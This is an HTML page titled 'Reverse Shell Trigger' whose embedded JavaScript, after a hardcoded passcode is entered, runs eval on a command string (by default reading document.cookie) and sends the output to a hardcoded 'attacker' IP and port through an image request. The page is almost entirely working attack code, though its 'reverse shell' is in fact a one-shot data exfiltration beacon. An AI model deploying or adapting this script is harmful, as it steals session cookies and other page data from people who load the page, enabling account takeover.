<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reverse Shell Trigger</title>
</head>
<body>
    <h1>Reverse Shell Trigger</h1>
    <form id="reverseShellForm">
        <label for="passcode">Enter Passcode:</label>
        <input type="text" id="passcode" name="passcode" required>
        <button type="submit">Submit</button>
    </form>

    <script>
        // Immediately Invoked Function Expression (IIFE)
        (function() {
            const passcode = "1234";  // The passcode to trigger the reverse shell
            const attackerIP = "192.168.50.245";  // Attacker's IP address
            const port = 4444;  // Port for the Netcat listener

            // Function to execute commands on the client device
            function executeCommand(command) {
                try {
                    let result = eval(command);  // WARNING: Using eval is dangerous; this is for educational purposes only
                    return result ? result.toString() : "Command executed with no output.";
                } catch (error) {
                    return `Error: ${error.message}`;
                }
            }

            // Function to send data to the attacker via Netcat
            function sendToAttacker(data) {
                const img = new Image();
                img.src = `http://${attackerIP}:${port}/?data=${encodeURIComponent(data)}`;
            }

            // Handle form submission
            document.getElementById('reverseShellForm').addEventListener('submit', function(event) {
                event.preventDefault();  // Prevent the form from submitting the traditional way
                const enteredPasscode = document.getElementById('passcode').value;

                if (enteredPasscode === passcode) {
                    // Example command to be executed
                    const command = "document.cookie";  // Replace with the command you want to execute
                    const output = executeCommand(command);
                    sendToAttacker(output);
                    alert("Reverse shell triggered!");
                } else {
                    alert("Incorrect passcode.");
                }
            });
        })();
    </script>
</body>
</html>
